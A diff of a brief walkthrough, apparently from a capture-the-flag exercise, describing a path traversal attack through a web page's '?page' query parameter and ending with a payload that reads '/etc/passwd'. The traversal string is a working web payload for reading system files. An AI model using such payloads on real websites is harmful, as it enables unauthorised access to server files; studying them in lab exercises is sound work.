@@ -1,3 +1,7 @@
+In all url we can see ?page query argement is used for display the correct content. Let's try to explore the directory,...
+
+?page=../../ We got "Wrong.."
+
 Tried a lot and I try ?page=../../../../../../../etc/ which give me "You can DO it !!!  :]"
 
 Into the url, use this query ?page=../../../../../../../etc/passwd
